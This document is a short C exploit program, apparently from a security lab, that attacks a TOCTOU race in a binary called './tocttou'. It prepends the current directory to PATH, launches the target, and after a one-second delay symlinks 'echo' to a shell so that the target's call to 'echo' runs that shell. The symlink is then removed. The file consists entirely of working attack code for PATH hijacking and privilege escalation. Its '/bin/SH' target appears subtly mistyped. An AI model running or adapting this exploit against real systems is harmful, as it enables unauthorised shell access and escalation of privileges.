#include<unistd.h>
#include<string.h>
#include<stdio.h>
#include<stdlib.h>
#include<sys/wait.h>
#include<sys/types.h>

    int main()
    {
        char path[100] = "PATH=:";
        char cwd[100] = "";

        getcwd(cwd, sizeof(cwd));
        strcat(path, cwd);

        strcat(path, ":");

        strcat(path,getenv("PATH"));
        putenv(path);
	pid_t pid = fork();

	if(pid == 0)
	{
		char * argv[] = { "./tocttou","Hello, have a nice day!", NULL };
        	execv(argv[0], argv);
	}

	else
	{
  		sleep(1);
		system("ln -s /bin/SH echo");
        	int status;
        	wait(&status);
        	system("unlink echo");
	}

        return 0;

    }

